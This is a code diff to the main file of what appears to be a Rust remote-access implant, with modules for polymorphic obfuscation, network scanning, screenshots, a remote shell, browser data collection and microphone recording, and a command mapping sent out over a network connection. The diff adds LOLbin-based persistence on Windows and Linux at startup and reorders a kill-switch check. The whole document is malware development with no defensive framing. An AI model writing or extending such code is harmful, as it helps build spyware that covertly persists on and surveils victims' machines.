@@ -9,6 +9,7 @@ mod network_scanner;
 mod poly;
 mod screenshot;
 mod shell;
+mod persistance;
 
 use rand::Rng;
 use std::collections::HashSet;
@@ -17,6 +18,16 @@ use tokio::task::JoinHandle;
 #[tokio::main]
 async fn main() {
     poly::init_polymorph_functions();
+
+    #[cfg(target_os = "windows")]
+    persistance::setup_persistence_lolbin();
+    #[cfg(target_os = "linux")]
+    persistance::setup_persistence_linux();
+
+    if kill_switch::check_ks().await {
+        eprintln!("Arrêt du programme : kill switch activé");
+        return;
+    }
     
     if let Some(cmd_map) = poly::get_command_map() {
         let mapping = connexion::CommandMapping {
@@ -28,15 +39,10 @@ async fn main() {
             browser_info: cmd_map.get("browser_info").unwrap().clone(),
             mic_rec: cmd_map.get("mic_rec").unwrap().clone(),
         };
-        
+
         if let Err(e) = connexion::send_mapping(&mapping).await {
             eprintln!("Erreur envoi mapping: {}", e);
         }
-    }
-
-    if kill_switch::check_ks().await {
-        eprintln!("Arrêt du programme : kill switch activé");
-        return;
     }
 
     let num_to_command = [
